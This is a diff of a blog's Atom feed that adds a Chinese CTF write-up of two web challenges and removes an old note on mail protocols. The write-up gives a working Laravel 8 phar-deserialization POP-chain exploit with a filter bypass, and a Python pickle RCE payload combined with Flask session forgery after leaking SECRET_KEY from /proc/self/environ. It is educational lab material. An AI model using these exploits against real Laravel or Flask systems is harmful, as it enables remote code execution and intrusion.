@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://vuln.top/"/>
-  <updated>2021-01-10T09:50:18.130Z</updated>
+  <updated>2021-05-08T04:12:08.424Z</updated>
   <id>https://vuln.top/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>虎符线下赛WEB</title>
+    <link href="https://vuln.top/2021/05/08/16204457586099/"/>
+    <id>https://vuln.top/2021/05/08/16204457586099/</id>
+    <published>2021-05-08T03:49:18.610Z</published>
+    <updated>2021-05-08T04:12:08.424Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="tinypng"><a href="#tinypng" class="headerlink" title="tinypng"></a>tinypng</h2><p>题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png" alt><br>首先查看路由信息<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png" alt></p><p>先查看一下<code>fileupload</code>路由，可以发现文件上传时对内容进行了过滤，且只允许上传<code>png</code><br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png" alt></p><p>接着我们看image路由，进入<code>ImageController</code>，<code>$source</code>可控接着判断是否为<code>png</code>结尾，如果为<code>png</code>结尾则传给<code>imgcompress</code>类。<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png" alt><br>进入<code>imgcompress</code>类，<code>$this-&gt;src</code>为我们传入的<code>$source</code><br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png" alt><br>接着又传递给<code>compressImg</code>类，调用了<code>openImg</code>方法<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png" alt></p><p>将<code>$source</code>传递给了<code>getimagesize</code>，<code>getimagesize</code>可以触发<code>phar</code>反序列化<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png" alt></p><p>现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。<br>从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct($events, $event) &#123;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class BroadcastEvent &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct($connection) &#123;</span><br><span class="line">            $this-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus &#123;</span><br><span class="line">    class Dispatcher &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        public function __construct($queueResolver)&#123;</span><br><span class="line">            $this-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $c = new Illuminate\Broadcasting\BroadcastEvent(&apos;whoami&apos;);</span><br><span class="line">    $b = new Illuminate\Bus\Dispatcher(&apos;system&apos;);</span><br><span class="line">    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);</span><br><span class="line">    #print(urlencode(serialize($a)));</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar=new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&apos;GIF89a&apos;.&quot;__HALT_COMPILER();&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($a);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过如上exp生成<code>phar</code>文件，使用<code>gzip</code>打包修改为png后缀<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png" alt></p><p>上传文件<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120729.png" alt></p><p>访问<code>/image?image=phar://../storage/app/uploads/xx.png</code>，成功代码执行<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120747.png" alt></p><p>##Easyflask<br>根据页面提示访问<code>/file?file=/app/source</code>可以获取到源代码<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120805.png" alt></p><p>把代码复制到本地编辑器，便于分析。可以看到<code>file</code>路由为文件读取，对后缀存在一定限制，但是也可以读取到部分文件。<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120823.png" alt></p><p>在代码头部发现SECRET_KEY存放在环境变量中<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120839.png" alt></p><p>我们可以通过读取/proc/self/environ文件，获得SECRET_KEY<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120853.png" alt></p><p>接着看admin路由存在pickle.loads，u参数可控那么就存在python反序列化漏洞（参考<a href="https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/）" target="_blank" rel="noopener">https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/）</a><br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120916.png" alt><br>编写并运行EXP脚本，获得一串BASE64</p><figure class="highlight plain"><figcaption><span>base64</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class User(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        a = &quot;`cat /flag &gt;/tmp/1.txt `&quot;</span><br><span class="line">        return (os.system,(a,))</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(u)</span><br><span class="line">bu = base64.b64encode(u)</span><br><span class="line">print(bu)</span><br></pre></td></tr></table></figure><p>接着通过获取到的KEY，使用脚本伪造FLASK的Session（<a href="https://github.com/noraj/flask-session-cookie-manager）" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager）</a><br>-s参数为SECRET_KEY，-t 参数为反序列化的内容<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121004.png" alt></p><p>通过生成出的Session访问/admin路径，返回500为成功<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121023.png" alt></p><p>接着进行文件读取获得flag<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121037.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;tinypng&quot;&gt;&lt;a href=&quot;#tinypng&quot; class=&quot;headerlink&quot; title=&quot;tinypng&quot;&gt;&lt;/a&gt;tinypng&lt;/h2&gt;&lt;p&gt;题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架&lt;br&gt; 
+      
+    
+    </summary>
+    
+    
+      <category term="ctf" scheme="https://vuln.top/tags/ctf/"/>
+    
+  </entry>
   
   <entry>
     <title>通达OA文件上传&amp;文件包含导致RCE复现</title>
@@ -422,30 +445,6 @@
         &lt;!--markdown--&gt;第一题:calc
 
 &lt;p&gt;calc看样子是命令执行&lt;br&gt;通过n次尝试，成功执行代码&lt;br&gt;![W))I3(_DS&lt;a href=&quot;http://118.126.66.150/52sec/08/3428682806.png&quot; target=&quot;_bla
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>[读书笔记] mail理论</title>
-    <link href="https://vuln.top/2019/02/21/57/"/>
-    <id>https://vuln.top/2019/02/21/57/</id>
-    <published>2019-02-21T04:16:28.000Z</published>
-    <updated>2019-02-23T15:25:24.660Z</updated>
-    
-    <content type="html"><![CDATA[<!--markdown-->很久之前的笔记整理下<p>MX代表的是MaileXchange，当一封邮件要发送出去的时候，邮件主机会先分析那封信的目标的DNS 先取得MX标志（注意 MX标志可能会有多部主机)然后以最优先MX主机为准将信发送出去</p><p>我们熟悉的outlook、foxmail等都是用来收信和发信的，称之为MUA:mail user agent，邮件用户代理</p><p>MUA并非直接将邮件发送至收件人手中，而是通过MTA:Mail Transfer Agent，邮件传输代理代传递，sendmail和postfix就是扮演MTA的角色</p><p>一封邮件的流程是：<br>发件人：<figure class="highlight plain"><figcaption><span>MTA --> 若干个MTA -> MTA -> MDA <-- 收取 --mua:收件人```< span></--></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MUA到MTA,以及MTA到MTA之间使用的协议就是SMTP协议，而收邮件时，MUA到MDA之间使用的协议是最常用的POP3或IMAP。</span><br></pre></td></tr></table></figure></p><p>MUA: 用户代理端，即用户使用的写信、收信客户端软件<br>MTA:邮件传送端，即常说的邮件服务器，用于转发、收取用户邮件<br>MDA:邮件代理端，相当于MUA和MTA的中间人，可用于过滤垃圾邮件<br>POP:邮局协议，用于MUA连接服务器收取用户邮件，通讯端口110<br>IMOP:互联网应用协议，功能较多POP多，通信端口143<br>SMTP:简单邮件传送协议，MUA连接MTA或MTA连接MTA发送邮件使用此协议，通讯端口25</p><pre><code>![mail-flow.gif][1]1）发信端于收信端两台主机间会经过一个握手（ehlo）的阶段，此时发信端会被记录为发信来源（而不是mail from）。通过握手后就可以进行邮件标题（header）的传送2）此时收信端主机会分析标题的信息，若邮件的“mail to:主机名”为收信端主机，且该名称符合mydestination的设置，则该邮件会开始被接受到队列，并进一步送到mailbox当中；若不符合mydestination的设置，则终止连接且不会进行邮件内容的传送3）若“mail to：主机名“不是收信端本身，则开始进行中继转发（relay）的分析4）转发过程首先分析该邮件的来源是否符合信任的客户端5）分析邮件来源或目标是否符合relay_domains的设置，若符合则邮件将接受至队列，并等待MDA将邮件再转发出去6）若这封邮件的标题数据都不符合上述的规范，则终止连接，并不会接受邮件的内容数据。  [1]: http://118.126.66.150/52sec/08/3640427257.gif</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;!--markdown--&gt;很久之前的笔记整理下
-
-&lt;p&gt;MX代表的是MaileXchange，当一封邮件要发送出去的时候，邮件主机会先分析那封信的目标的DNS 先取得MX标志（注意 MX标志可能会有多部主机)然后以最优先MX主机为准将信发送出去&lt;/p&gt;
-&lt;p&gt;我们熟悉的out
       
     
     </summary>
